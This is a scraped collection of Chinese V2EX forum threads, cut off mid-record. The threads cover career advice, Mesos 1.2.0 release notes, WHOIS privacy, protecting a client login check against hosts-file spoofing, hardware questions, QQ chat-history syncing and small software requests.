"数学书的话，我个人比较推荐用英文版的去自学，不过中文版的如果你认真跟着教授的讲课走估计也不差。这里面的差距在于英文版的书会有比较多的例子引导初学者，有很多书在讲概念之前会用不怎么精确的自然语言给读者建立一个直观印象。但是中文版大多是定理-证明的组织逻辑，直观印象需要老师讲，或者你自己想象。所以不推荐中文版教材自学……", "顺便偷偷告诉你一个盗版 PDF 下载网站： ", "哈哈", " 好的，的确整天闷头学习眼界会很狭隘，该找时间去走走", " 谢谢建议！边看边学这个不错，英文书我会找来看看的，同样喜欢英文教材（偷偷收藏了网址", " 你笑啥？？", " 抓到一个大我三年的😀", "关于就业这件事情，没有什么方向是不受培训班影响的，但影响的终究是初级人员。\r", "公司对中高级的需求是非常强烈的，即使是处于人才储备的目的，也是会欢迎的。\r", "所以，希望你选择一个喜欢的方向，然后深入去研究，技术实现一精多长后，开始尝试技术总监等管理路线是不错的选择。", " 666", "二十一世纪是生物科学的世纪", "重要的不是什么语言，是学习方法和解决问题的能力", " 二十一世纪是生物科学的世纪    —— 师医公", "前端竞争超大的（抹眼泪……\r", "\r", "这么年轻尝试搞搞人工智能机器学习大数据分布式也不错啊，阿里有很多比赛可以练手的\r", "\r", "语言的话，大概 java 和 python 是目前主流？\r", "\r", "大一就有这份心挺好的，多参加一些极客组织吧，实战经验会多一些", "确实，大方向上是 java 的天下，但是，不管是哪个方向学精了都根本不愁找不到工作", "楼主别听他们胡扯什么大一该多玩。现在出去哪个公司不是要几年经验的，大学要是玩开了，怎么可能出去会有经验。有兴趣别怂，拿起键盘就是干，方向什么的选错了还可以再转，大不了下班后学习。我就是几年前选错方向的猴生仔，现在不照样边干活变转方向，感觉过不了多久都要成全栈了。有一个方向的经验，其他学起来也快，什么 前端 后端 移动端 机器学习 我都涉略过了，感觉都挺有意思。", "大多数做 it 行业的人，都会在 it 行业吊死。\r", "多跟其他行业的人交流沟通，并鼓起勇气尝试。\r", "\r", "\r", "当你想要改变的时候。", " app 端都跟 web 前端要融合了，楼主挑一个感兴趣的方向好好撸就行", " 在 C++在通信行业 or 游戏行业比较多～"]},
{"content": "", "reply": "目前尚无回", "tittle": "请教， 用 web 技术能不能做出来支持多显示器的应用?", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://i.v2ex.co/ct6zDc9T.jpeg\"></p>\n<h2>Mesos 1.2.0 Release 解读</h2>\n<p>Mesos 刚刚发布了最新的 1.2.0 版本， 新版本解决了社区之前呼声比较多的几个问题，看得出 Mesos 开发组的推进进度还是非常快速而平稳的。这也是 Mesos 社区一贯的作风， 核心 Feature 稳定优先，周边功能积极支持。</p>\n<p>根据 1.2.0 Release note 列出的几个新 Feature ， 可以看到几个主要的改进都是围绕着容器相关的， 其中既包含对 Mesos Containerizer 改进， 同时也有对 Docker Containerizer 功能补充， 这些工作都是围绕之前 Mesos 社区提出的 Unified Containerier 目标来进行的。</p>\n<p>容器化和 Docker 技术在开发者中间已经广泛流行，将来的服务标准化，容器化应该会做的越来越好， Mesos 作为调度系统的首选， 顺应潮流也是大势所趋。如何更好地支持容器化应用的调度应该是 Mesos 近期的工作重点。</p>\n<p><a href=\"www.shurenyun.com\" rel=\"nofollow\">数人云</a>逐一分析 Release Note 中的各个部分：</p>\n<h2>MESOS-5931</h2>\n<p><strong>Mesos Containerizer 实验性支持 auto backend ， overlayfs 优先于 aufs ，由于 bind backend 需要事先存在，需要通过 agent 启动时的 image_provisioner_backend 参数明确指出。</strong></p>\n<p><strong>解读——</strong></p>\n<p>相比 Docker Containerizer ， Volume 一直是 Mesos Containerier 的弱点，由于 Layered 存储一开始就是 Docker 的招牌优势，目的是减少运行时容器对存储的过度使用。 Docker 当前支持 Aufs ， Overlayfs ， DeviceMapper 集中 CoW 形式的 Volume ， Bind Mounted Volume 本质上不是一种 CoW 存储，目的更多是帮助在 Host 和主机之间做存储共享。</p>\n<p>Docker 社区下一步主要推的是 OverlayFS 和 OverlayFS2 ，而之前生产环境应用比较广泛的 DeviceMapper 却没有在 Mesos 支持范围， 看得出 Mesos 是紧跟 Docker 脚步的。</p>\n<p>Agent 启动增加了 image_provisioner_backend 参数， 目的是指定预先设定的 bind backend 地址。</p>\n<h2>MESOS-6402</h2>\n<p><strong>（实验）支持 Mesos containerizer 的 rlimit 。对于使用 Mesos containerizer 来启动容器， Isolator 添加了对设置 POSIX 资源限制（(rlimits ）的支持。 POSIX rlimits 可以被用来控制一个进程中耗费的资源。细节见 <a href=\"http://mesos.apache.org/documentation/latest/posix_rlimits/%E3%80%82\" rel=\"nofollow\">http://mesos.apache.org/documentation/latest/posix_rlimits/。</a></strong></p>\n<p><strong>解读——</strong></p>\n<p>Mesos 之前支持 isolator 如 posix/cpu, posix/mem ， 以及 cgroup/cpu 等， 这次又增加了 rlimit isolator, 可以更灵活的配置 Executor 比如文件句柄数量， connection 数量等。</p>\n<h2>MESOS-6419</h2>\n<p><strong>（实验） Teardown 未注册的 Framework 。 Master 现在对待恢复的 Framework 将和对待已经注册但是当前断开连接的 Framework 非常类似。举例来说，当通过 HTTP 请求 Framework 时，恢复的 Framework 将通过正常的“ Frameworks ”部分进行报告。它意味着不再有“孤儿任务”的概念：如果 Master 知道这个任务，任务就会运行在 Framework 之下。类似的，在恢复的 Framework 上的“ teardown ”操作现在已经正常工作了。</strong></p>\n<p><strong>解读——</strong></p>\n<p>Teardown unregistered frameworks ， 通过这个改进，目测可以 TearDown 一些超时的 Frameworks ，可以很好的清理 Frameworks 下的 tasks ， 之前困扰 Swan  [数人云开源 Mesos 调度器] 开发的一个问题就是如何清理 Crashed 之后的 Swan 的 task 问题，通过这个功能可以很好的帮助 Swan 解决这个问题。</p>\n<h2>MESOS-6460</h2>\n<p><strong>（实验）容器的 Attach 和 Exec 。这个特性为正在运行的 Mesos 任务附加一个远程客户端到其 stdin, stdout 和 stderr 上提供了新的 Agent API ，也提供了一个在同一容器内启动新进程作为运行的 Mesos 任务、并附加到它的 stdin, stdout 和 stderr 上的 API 。在更高的层面，这些 API 在功能上模仿了 Docker attach 和 Docker exec 。这个特性主要是为了让用户能够调试运行中的 Mesos 任务。</strong></p>\n<p><strong>解读——</strong></p>\n<p>针对 Docker Containerizer 的一个改进， 之前由于没有此功能 Debug 时候都是通过 Mesos task 找到对应的 Docker 容器， 接着通过 Docker 命令进入到容器当中看 Docker 运行时状态， 还好数人云的产品之前通过 Proxy 到 Docker daemon 已经解决了这个问题， 现如今如果 Mesos 能解决这个问题， 可以考虑通过 Mesos attach 到容器当中， 不过性能有待考虑， 毕竟运行时日志是个挺可怕的量。</p>\n<h2>MESOS-6758</h2>\n<p><strong>（实验性）在 Mesos Containerizer 支持“ Basic ” Docker 私有镜像仓库验证。直到目前， Mesos Containerizer 一直假定 Bearer auth ，但是现在我们也为私有镜像仓库支持” Basic auth ”。请注意 AWS ECS 采用了 Basic authorization 但是尚不可用，因为 MESOS-5172 的重定向问题。</strong></p>\n<p><strong>解读——</strong></p>\n<p>私有镜像仓库验证的问题一直是困扰我的问题，这次 Mesos 终于考虑到这个问题了。 之前普遍的做法，包括 Marathon 都是将私用仓库的用户名密码达成 tar 通过 fetch 功能下载到 sandbox 当中， Docker executor 启动之后发现账号后模拟登陆，其实 Docker API 早有支持，有了 Basic HTTP auth 就不用绕一大圈解决登录问题。</p>\n<p>此外，还有 200 多个 bug 修复和改进。对于全部的版本更新说明，请移步 <a href=\"https://git-wip-us.apache.org/repos/asf?p=mesos.git;a=blob_plain;f=CHANGELOG;hb=1.2.0\" rel=\"nofollow\">https://git-wip-us.apache.org/repos/asf?p=mesos.git;a=blob_plain;f=CHANGELOG;hb=1.2.0</a> 。</p>\n<p><strong>关于更新：</strong></p>\n<p>从 Mesos1.1.0 滚动更新到 Mesos1.2.0 非常简单。只有一些小的调整，向后兼容的降低。更新过程中的细节请参考 <a href=\"http://mesos.apache.org/documentation/latest/upgrades/%E3%80%82\" rel=\"nofollow\">http://mesos.apache.org/documentation/latest/upgrades/。</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "解读 | Mesos 1.2.0 Release", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>v 友们域名服务商都是那些啊 !其他域名商支持 whois 保护吗!我的西部数码支持,想了解一下其他域名商是否也支持....</p>\n</div></div>"], "reply": "33", "tittle": "关于域名保护的一个问题!", "comment": ["就是隐藏网站所有人邮箱信息？  那个有的，腾讯云，阿里云上都有", "所有服务商都支持 whois 保护", "Namesilo 有免费的 Whois 保护", "阿里云好像.cn 的不支持", "namesilo+1", "基本上所有的注册商都支持 whois 保护。\r", "区别只在于有些注册商免费提供这个功能，并且支持 whois 隐私保护后的联系人邮件转发，有些注册商要收费或者不能提供联系人邮件转发。\r", "我用 namesilo ，免费提供该功能", "阿里云有些后缀打开隐私保护之后依然显示邮箱地址。比如.me .date", "基本上所有的注册商都支持 WHOIS 隐藏\r", "但是是否有保护，要看注册局的政策，如果注册局不允许 WHOIS 隐藏，那就无效", "Namesilo+2", "namesilo+10086", " 国别域名不允许隐藏 whois 好像", "其实我一直想看人说说 namesilo 有哪些坑来着，该不会是纯良心……\r", "\r", "发个 aff 算了： namesilo 新用户在 promotion code 输入 saveonecode 省一刀。", "namesilo 好像免费保护。", "为什么 Namesilo 既便宜有提供免费 whois 保护呢", " 国别域名是看注册局要就的，有的直接隐藏邮箱名字只有个 NS ，有的全都给你打出来，有的支持隐藏", "namesilo  + 2\r", " ", " \r", "\r", "话说当时备案的时候， GXB 让我先取消了 Private ，备案过了之后立马恢复", "都支持 whois 隐私的，我用 ", " ，第一年用优惠码可以免费。除非域名的管理规定禁止这么做。", "国内的基本都免费支持 whois 如：阿里云 易名等。。。\r", "\r", "国外的有： ", " 还有 namesilo 是免费的。\r", "\r", "然后我个人喜欢把域名放国外，并要能开启两步验证的。\r", "虽然 Godaddy 的 Whois 隐藏要收费。 但是他支持两步验证啊，所以我选择他。\r", "\r", "ps:Godaddy 现在支持 2 步验证。密码+手机验证码登陆很好。", " \r", "namesilo 也支持二步验证。", "备案过后这个域名隐私保护等于掩耳盗铃。", " 我没有备案的...", "很多注册商都支持，**但并不是所有域名注册局都允许**。", "阿里云的.me 域名，开启隐私保护以后，还是会显示姓名和邮箱。", "美橙互联注册的 cn 续费了好几年，贵好多还全部信息给我显示出来，在想怎么还不倒闭", "cn 好像不行，其实国外买域名很多可以直接不写真名的", "用的 ", " 和 Google domain\r", "主要是 g 家支持的 tld 太少了\r", "\r", " 要用到仲裁或者注册局检查的时候就该哭了", "我也想问一下在聚名一口价域名怎么保护", " 没什么事吧，国外域名商的联系方式和 whois 随时改都能生效的", " 为什么这么说？备案后也查不到啥信息啊", " 。。。手抖按到了回复。\r", "\r", "备案后能查到真实姓名就足够了，很多情况下就能顺藤摸瓜搜出其他信息。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在看 spark 的 mlib 包，用的是 Java 语言，发现把包导入后本地机器直接 run 就可以跑出结果，看日志感觉是每次都启动 spark 进程， helloworld 级别的跑一次也要好几秒，这里是不是 spark 的启动花了不少时间？想问问你们一般是怎么开发调试的</p>\n</div></div>"], "reply": "2", "tittle": "spark 的开发环境应该是怎样的？", "comment": ["用 Scala ，小东西直接在 spark-shell 下面试", " 一楼真理了"]},
{"content": "", "reply": "目前尚无回", "tittle": "大家安装 vs2017 花了多久，感觉贼鸡巴慢", "comment": []},
{"content": ["<div class=\"topic_content\">一个 c#写的客户端\r<br>登录时使用 HTTP 协议到服务端验证\r<br>假如有用户修改 hosts,把我服务器的域名指向到 localhost 并且返回正确的内容\r<br>那验证这块是不是就废了?\r<br>怎么破?</div>"], "reply": "13", "tittle": "hosts 劫持域名.怎么破?", "comment": ["ssl", "一楼的办法，加 ssl 。要么返回的数据用自己的私钥加密，客户端用公钥解密后再验证", "\r", "看看上面链接 数字签名的一块, 通过数字签名 你的客户端就能确定 对方是不是具有私钥的一方(假设就你服务器有私钥)", "每次登陆在客户端和服务端生成一组有规律的数（比如是 sha256 （ date ） xor 365 ）进行二次验证 /斜眼", " \r", " \r", " \r", " \r", "流程大概是这样的,假如一个用户现在是正常状态,服务器返回的 json 是{\"ret\":1} (当然,json 字符串是经过简单加密的)\r", "然后在后台把这个用户禁用{\"ret\":0}\r", "用户发现用不了,把域名指向 localhost 自己写的一个简单的网页,也一样返回加密后的{\"ret\":1}\r", "应该要在 json 里加上使用时间", "这个问题解决起来并不困难。楼主的问题在于验证的服务器被假冒了，所以问题就转化为了如何防止验证服务器被假冒。\r", "\r", "上面 @", "  的回答就是一种思路。\r", "\r", "总体看有两个思路：\r", "\r", "1. 验证的方法不被用户所知，但是程序是可以逆向的， ssl 流量也可是可以被中间人劫持的。（无非是增加点难度）\r", "2. 把验证放到服务端来做，验证不过就不提供服务\r", "   （比如校验一个 token ，这个 token 的算法的其中一步是由你的服务器的提供的独有的计算结果）", "https 可以中间人 应该加 hpkp", "我在想的是，既然是 C#写的客户端，那么意味着用户可以反编译 ，可以直接去除验证功能，无论什么 ssl 之类的解决方案都是无效的。", " 嗯 这也是最大的问题 但会在外面随便加个壳 随便限制就行了\r", "现在的方案是:\r", "\r", "启动后先做域名解析,解析出服务器真正的 IP 地址,然后在返回的 JSON 中带上服务器 IP\r", "并且和客客户端解析出来的 IP 做校验,不相同就报错", "验证后返回一个 token 设置有效期（比如一个小时）", "所有的操作都要验证 token ，这样行不行", " \r", "不太行\r", "因为 token 的前提是要连接上正常的网站接口,如果劫持了域名,token 就失去了作用了", "这看你做个客户端是用来做什么功能的\r", "1.如果你客户端只是操作的发起者,而操作的具体执行在服务端完成,那么这么登录验证别人就无法模拟,即使模拟了登录成功,也不能模拟后续的具体功能操作(比如调用支付宝的支付 api 发起一个支付的动作,客户端只是发起支付,但是支付的具体过程是在支付宝的服务器后台完成的)\r", "2.如果你的客户端就可以完成功能而不依赖服务器,那么这个验证无论如何都是可以破解的,只是复杂的验证可以增加破解的难度,如果破解的成本超过了使用你这个软件的成本,那么别人就不会来破解你这个软件了(比如 VC,IDEA 等,都是付费的软件,但是软件的使用不依赖于服务器,所以大家都能找到破解版)", "曾经做过一个类似网络验证的程序,提供 2 条思路.\r", "\r", "1.既然害怕别人模拟你的算法,那么就尽量做到算法尽可能难被逆向..比如返回 JSON 加密按照服务器的时间作为参数和本地作对比?如果过期那么就作废,这招可以防止本地的模拟和保障验证的合法性,也就是说 封包唯一性.\r", "\r", "2.业界有说法叫暗桩的东西,既然你知道破解者可能利用这点来进行破解,那么你应该正当维护自己的合法性,正常用户使用不可能去修改 HOSTS 指向本地,那么 是否有策略让非法使用者付出代价?"]},
{"content": ["<div class=\"topic_content\">期初怀疑是线的问题，买了根新的线 发现 依旧接触不良     \r<br>我买了假的 hhkb ？\r<br>万能的 v 友   求指导   只能拆开换接口？？？</div>"], "reply": "4", "tittle": "1 年多的 HHKB 要坏了？？", "comment": ["拆开换不需要多大动作，大不了寄给别人修", " 拆开换个接口么    不会啊  233", " 淘宝有修这些的，怡科那里应该可以的。\r", "电脑城都有修吧。能修主板的那些基本都能搞定啦。\r", "\r", "你买个接头就可以了。", " ok  谢啦"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>目标：</h2>\n<p>好又快的把一篇文章变化成 pdf ，并导入 iPad 中的 PDF expert 进行手写标注</p>\n<h2>我之前的方法：</h2>\n<ol>\n<li>在 MacBook 中使用印象笔记的剪藏工具，把正文剪藏近印象笔记</li>\n<li>进入印象笔记客户端，点击标注并把文章保存为 PDF</li>\n<li>把 PDF 移入 Dropbox</li>\n<li>在 iPad 中打开 PDF expert ，从 Dropbox 提取这篇 PDF ，开始标注</li>\n</ol>\n<h2>我的方法愚蠢在：</h2>\n<ol>\n<li>iOS 端的印象笔记，是无法把一篇富文本保存为 PDF 的，只能在 Mac 端上这么干</li>\n<li>为什么我不用 Commad+P 然后保存为 PDF 呢，因为剪藏能把正文剪藏出来，而不是 web 周边乱七八糟的广告啊，评论一起收进去</li>\n</ol>\n</div></div>"], "reply": "6", "tittle": "谁能告诉我，如何好又快的把一篇网络文章变成 PDF，并可以标注", "comment": ["Chrome 插件 Clip to Onenote  能自动选择文章区域", "chrome ， 选中想保存的文字，右击，打印。目标里面选另存为 pdf 。完事。", "可以使用印象笔记的悦读插件，不过这个插件下架了，只能下载 crx 文件导入到 chrome 里面。\r", "使用悦读转换后直接用 chrome 的打印功能导出 pdf 试试", "chrome CTRL-P 保存为 PDF", "Chrome 、 Firefox 都能把网上文章打成 PDF"]},
{"content": "", "reply": "9", "tittle": "有人用 upwork 没? 感觉上面的价格好廉价....", "comment": ["关键是没经验，没作品很难被选中", "因为很多印度人", "以前接触过，大约一年多以前，后来感觉是市场被做烂了，就没再关注", "3000 多刀的活阿三门 300 刀就接，搞鸡毛啊", " \r", " \r", " \r", " \r", "一个 ios+android 的 app, 还是视频类的才 3-4 万 rmb, 太没意思 了", "有，市场被印度占领。讨厌印度人。", "昨天还谈了一个课程设计类的。倒是挺简单，但是要做 3 套服务端+客户端。\r", "价钱么，一共 100 刀，其中平台抽 20 刀，干活儿的到手才 80 刀。\r", "本想攒点经验，老板开口要 24 小时内交活儿。。。还是算了吧。", " 哈哈哈哈哈哈哈哈哈哈", " 你牛"]},
{"content": "", "reply": "50", "tittle": "问大家一个问题，你的电脑多久没关机了", "comment": ["用完就关", "很好奇你把电脑当服务器用吗", "你如果去 mac 板块或者 笔记本 板块,应该能得到很久没管过的结果.\r", "\r", "用 PC 的估计不用的时候都会关掉,毕竟电费在那卡着呢.\r", "\r", "常用 PC 每天睡醒开,睡前关.\r", "旁边的 NUC 一个多月没关过了.", "震惊，都 2017 年了还有人关机？想省电直接睡眠不就好了", "自黑的时候请不要带上别人", "台式机现在 Uptime 71 天， Windows 10 。\r", "公司里办公电脑 Uptime 57 天，也是 Windows 10 。", "每天睡前关机。", "公司电脑\r", "\r", "![snipaste20170311_124041.png]( ", ")", "去 Mac 板块吧……\r", "\r", "我 mac 可能就一个月左右，如果不是更新要重启，基本不会关机。关机干嘛，掀开电脑就直接开工了，难道还要花时间去打开一堆东西？\r", "\r", "就是没电了，充电，打开电脑也会恢复断电前的状态。（暂时没试过断电）", "我关机一般都是系统更新要重启，或者系统出了 BUG 要重启，一般一个月左右关一次", "家里的每天都关，公司的一周关个一两次", "台式不用关，笔记本开低耗模式一直开", "最长的时候几个星期吧～～一直睡眠模式。。。", "笔记本直接合上屏幕就自动休眠了，很高效。\r", "需要用的时候打开屏幕即可。省时省力。", "蓝屏的时候会重启一次", "休眠算不算关机   如果不算那就好久了", "win7 最长半年", "除非切双系统，不然从不关机，过年回家带的笔记本也一直放在书房没关机过...", "3 年", "从来不关机，都是 sleep ，", "从来不关…除非更新要重启", "能不关机就不关。", "mac 已经忘记上次关机是什么时候了", "一周一次", "如无必要，从不关机。我的 NMB 平均一个月重启一次。", "公司一周一次。。。\r", "笔记本不用休眠，因为开着风扇转=在进灰啊。。。", "系统时间长了出小 bug 的时候会看下 uptime ，一般半个月左右，然后重启。", "还有人考虑电费……电脑能费几个电啊。刚才 systeminfo 看了一下，系统启动时间： 3 月 2 号。截图： ", "为什么不关机", "NAS 跑 Arch ，一周一滚，升级内核就 reboot 。\r", "平板一个月 N 久不关一次，如果可能的话，但是 Windows 10 连旋转下屏幕偶尔都能蓝屏的神奇系统，有时一天重启下好正常。\r", "其它机器： 问题来了：休眠算不算关机？", "12:27  up 77 days, 15:53, 2 users, load averages: 2.24 2.33 2.04", "家里的电脑一般是睡前关机。\r", "公司的电脑是不关机的，直到断电。", " 待机 80w 的电费我还是付不起的", "每天关机， 我尝试了一次一天不关机  gnome 就卡卡的", "从开机第一天起就没关机吧，不用就睡眠", "一般半个月会重启一下，不关机", "除非重启，否则不管，只休眠或睡眠。\r", "\r", "我感觉很多人每天都关机开机只是因为不知道怎么休眠——休眠只要一秒就能立即恢复使用，也不费电，平时没必要关机", "自从用了 Atom 之后， Mac 重启的频率大大加快", "昨天 Macbook 自己关机重启", "合盖就走", "我平时笔记本 mbp 基本不关机，除了卡死之外，然后工作机 ubuntu ，就我来公司上班开始，就基本没关过机", "笔记本，只用睡眠和重启", "台式机 不更新 不关机", "震惊，难道就我是直接合盖 sleep ？", "除非蓝屏死机，打大雷，软件更新，不然一般情况下不会关机，最多就是重启.", "我原来的单位，如果你下班走人不关电脑，老板会替你关掉。无论你那台电脑上在干啥……", "公司的 mac 好像从来就没关过机，除非有程序一直崩溃，能记起来的关机是去年圣诞节。", "公司电脑必须关机。家里的电脑，自选机箱，猫老是去按开机按钮，所以在我不知道的情况下开关了多少次我也不清楚……", " 有时候从 sleep 恢复之后会发现 CPU 被锁在 0.77 Ghz...", " 什么系统？我 windows10 的没有这个问题 ，掀起笔记本就可以工作了。"]},
{"content": ["<div class=\"topic_content\">不是很清楚，询问一下，</div>"], "reply": "22", "tittle": "美版 T460s 集显，能带起来 2k 的屏幕吗", "comment": ["你搜下看是不是支持这个分辨率", " 我搜过，一些是带独显，我这个是集显", "上联想官网，问问官方客服", " 国内的，美国联想就苦了我的英语了", "国内联想也有同样配置的，不妨先试试", " 好建议", "一定先试试，用的是松下屏，低频 PWM 调光。确认能接受再买。", "现在英特尔的 cpu 集成显卡都能带 4k ，不玩游戏的情况下", "看 cpu 带的集显型号，还有机身接口提供的带宽。", "正在用美版高配 t460s ，可以带的起，日常使用没问题。 也确实会闪屏，不过目前没什么大影响。 最大的影响是电池，日常使用只能 3 个小时左右，远远比 mbp ，让我难受了好久。", " 好的，谢谢，建议\r", " 不过这款显存好少\r", " 你的是什么配置，有其他问题吗，比如屏幕\r", " intel HD geaphics 520 128MB ，这个集显， HDMI 接口\r", " 我的集显只有 128MB ，这个可以吗", "屏幕没其他问题，就是用手机拍，发现有闪屏，听说不好。我是 i7 6600u ， 2k", "屏幕， 192g 。集显应该是和 CPU 关联的，我也忘了集显型号是多少了。", "自己去 intel 官方的 ark 去查吧\r", "\r", "\r", "以下参考：\r", "Processor Graphics: Intel® HD Graphics 520\r", "Graphics Output: eDP/DP/HDMI/DVI\r", "4K Support: Yes, at 60Hz\r", "Max Resolution (HDMI 1.4): 4096x2304@24Hz\r", "Max Resolution (DP): 4096x2304@60Hz\r", "Max Resolution (eDP - Integrated Flat Panel): 4096x2304@60Hz", "MacBook pro 13 寸的还不是照样独显带 2k", "不建议买高分辨率的屏幕，甚至 14 寸 1080p 都不推荐，除了看电影又点用，日常使用基本都是放大，各种软件不兼容。还特别伤眼睛。 1080p 最佳屏幕大小 24 寸， 2k 34 寸， 4k 43 寸。", "一个买了 t460s 1080p 高配版用了俩月又出掉，换台式机的路过", " 但是放大了，比如看网页，会更细腻清晰啊。。", " 好的，谢谢\r", " 据说会偶尔会卡一下\r", " 这建议，我收了\r", " 为何这么做", " 因为视力下降了~", " 好吧，我视力，也开始这样了", " 换回 24 寸显示器，然后坐远点，视力又恢复了一些。 打死也不买笔记本了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>win 版本 QQ 文件夹里 db 文件拷贝到 mac 版本 QQ 里是可以用，但是从 mac 版本 QQ 里拷贝 db 到 win 下，识别不出来。</p>\n<p>我习惯把聊天记录本地保存，超级会员漫游之类的不考虑。</p>\n<p>可以说 QQ 聊天记录的问题是让我始终不接受 mac 系统的最大问题。（个人有保留聊天记录的强迫症）</p>\n</div></div>", "<div class=\"topic_content\">我看很多人都在说用超级会员。\r<br>\r<br>首先我觉得 QQ 会员没有那么高的价值。其次，如果会员停了，那么多年的聊天记录丢要丢失了。再续费也不一定能找回来。只有存在本地才是最好的办法。</div>"], "reply": "39", "tittle": "MAC 版本的 QQ，有什么好办法可以把聊天记录同步到 win 版本的 QQ 里", "comment": ["常年保持会员", "超级会员，换过无数手机电脑了， 2010 年的聊天记录都还在", "SVIP", "你开不开 qq 会员，你的聊天记录都在腾讯的服务器上", "腾讯：不给钱我给你同步个 diao", " 以前的图片，挂了很多吧，语音也挂了很多吧", "SVIP ，想删都删不掉，掩面逃", "每个月帮我发传单半天，我帮你实现这个功能，不用你冲会员", " 给不给钱都同步，只不过不给钱我不给你看而已，只给 jc 看。", " \r", " \r", "并不会保存所有用户的聊天记录，也没有意义", " 腾讯员工?", "一直想做一个 保存终生记忆 的工具或者云服务", "消息管理器，导出全部消息记录，", " 并没有这个功能", " svip 一个月也就 20 吧，难道现在发传单都已经这么廉价了？", "  ", "  你没听懂我的意思吗,消息是肯定会在腾讯服务器上保存的,既然手写一个 mac 和 Win 的数据库转换成本太高,不如用会员解决.", "我有在写一个 LZ 说的程序，就是解析 qq 导出的 mht 格式的文件（其实挺简单的），存在自己服务器的数据库，自己在用，只是。。 UI 写的渣，实在拿不出手。。。", "搭车问一下， Mac QQ 怎样才能直接发送文件， 而不是先上传到疼讯服务器？", " 求，我 UI 都好说", "  mac 版本的 QQ 能导出 mht 文件吗？", "这个我弄过 mac 版客户端下有文件是保存消息记录的 复制下就行 不过有段时间没倒腾了\r", "贴个搜索的链接试试看 ", " mac 版本的用户文件直接替换到 win 版本 QQ 的用户文件是不生效的吧？", "用钉钉！", " 我穷。。今年发的奖金还在纠结买不买 mac 呢。。。你自己看看可不可以不就好了 0 0", " 你以为直接传就没有传到 QQ 服务器嘛~~天真 = =", " 有段时间 mac 版 ppt 天天崩溃 我就换 windows 办公了 应该是生效的 我回头试试去", " 开个会员，然后全部同步，， winQQ 导出全部消息记录，你爱放哪放哪， bak （可导入） mht （不可导入） txt （不可导入）任选", " 我也是买的旧款二手的。基本上半价。\r", " 会员要一直开着才能行，你不开会员，腾讯不会给你保存聊天记录的。你要导出的时候再开，之前的聊天记录也都没有了。", "QQ 的本地聊天记录会一直保存的，我的 Mac 上的聊天记录都有 5 年了\r", "另外楼主连自己的需求都没想清楚吧，如果你聊天记录你不是天天查看，你弄到 windows 上没啥意义，偶尔查询直接在 mac 下看就行了，这个功能腾讯不给你做，自己弄花费的精力够你买好几年会员了", " 你不是有本地记录么，，，你是想同步到 winqq ，又不是记录删除了想找回，，开个会员是性价比最高的方案了，，", " 是你搞错了，我最终还是要用 win 系统。如果我用一段时间 mac ，这段时间的聊天记录以后就没有办法导入到 win 系统里。\r", "\r", " mac 版本 QQ 聊天记录无法导入到 win 版本 QQ 里啊", " 都说了啊，开个会员就同步你的记录了，，，这是同步你之前的以后就不用了，，以后你消息设置里选上同步最近聊天记录到本机，漫游聊天记录→漫游七天（免费）， 7 天内不会一次 winQQ 都不打开的吧。。", " 这不就对了，如果不是偶尔查看，这个功能腾讯没做的话也没有现成的，自己要弄费很大的精力而且你还不一定能搞定，还不如用会员，再说这个本来就是腾讯挣钱的点", " 嗯，没法保证 7 天内肯定会上 win 系统，之前有一次 2 个月没上 win 系统，这段时间聊天记录都丢失了。", " 除了漫游聊天记录， QQ 会员一点价值也没有。如果单纯为了漫游记录，也没必要开 QQ 会员。所以我就是想问问有没有能搞定聊天记录同步的办法。", " 你这样聊天没朋友的，，，，另外，手机 QQ 也有同步聊天记录到本机，，最后一次回复", " 正确的办法是给腾讯产品经理提意见，说不定几个版本后问题就解决了，别想其他的手段了", "会员也没用啊。。。。超级会员也只是保存聊天记录两年了", " 我也不知道怎么惹到您了，一脸懵逼。另外，手机 QQ 的聊天记录没法持久化， QQ 一旦卸载聊天记录就丢失了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>由于最近公司太忙，这边朋友给介绍了一个微信项目 ，自己没有时间做 所以过来看看能不能在 V2EX 找到资源，就当交个朋友，可以远程办公(成都本地最好) 我会给你 git 地址，每天 10 点之前把写的代码提交上去就可以了。</p>\n<h2>项目描述</h2>\n<p>微信公众号项目，主要功能是在微信上面进行考试(后台自动阅卷)，目前只有选择题 ，其它功能就是新闻页面的现实，数据需要使用目前上线平台的数据，一共 4 个功能。</p>\n<h2>技能要求</h2>\n<p>前端：html5/css3/vue</p>\n<p>后台：Java/PHP/Nodejs 不限制</p>\n<p>项目周期 2 周</p>\n<blockquote>\n<p>没有规定后台语言，不过最好用 java 。</p>\n</blockquote>\n<h2>联系方式</h2>\n<p>具体的项目文档和价格请联系我微信： yumemor 备注： V2EX 详谈。</p>\n</div></div>", "<div class=\"topic_content\">已找到合适的小伙伴，大家不用在加我微信了哈。</div>"], "reply": "1", "tittle": "外包项目兼职", "comment": ["可以，我微信:hupengfei26"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>要求比 Excel 高点，但是最好不用 Excel 做，因为他们也不会买 Excel 。</p>\n<p>他们的特点是经常有些额外的工资项目，例如这个名目的费用、那个名目的奖金什么的，名称不一定，要能灵活应对。还有就是打印输出了，他们用 20 多年前的 1600KIII 针打。</p>\n<p>以前别人是用的 Foxpro</p>\n<p>有什么比较好的软件或者库做吗？能否推荐一下</p>\n</div></div>"], "reply": "28", "tittle": "帮熟人做个工资报表计算、打印的小玩意，有什么好的库或者软件吗？", "comment": ["openoffice 的 Calc ？这玩意有个 Scripting Framework ，(basic python js) 但是也没见人用过。。。\r", "\r", "不过要告诉他们不要把这个当 office 用， writer 文档到微软的 word 上去的时候有部分排版格式会错乱，不然他们以为你给搞了个 office ，然后出排版问题回过来怪你。。。", "delphi 好工具啊", "润乾，不过是付费的", "知人", "没啥钱的，有没有什么免费或者便宜点的，好学好用的？", "birt ？", "可以试试 薪人薪事", "谢谢大家的推荐，求更多", "最好能不要基于 web 的，四线城市小公司， XP 为主，那浏览器兼容性……", "ms office ，如果用 python 的话，就用 pandas ，可以做透视表", "![]( ", " )\r", "忘记说了，是这种表格，很传统的", "帮不上楼主什么忙，看看这么分析对不对。工作分两部分：一部分是编辑和计算，不基于 web 的话这部分得基于 pc 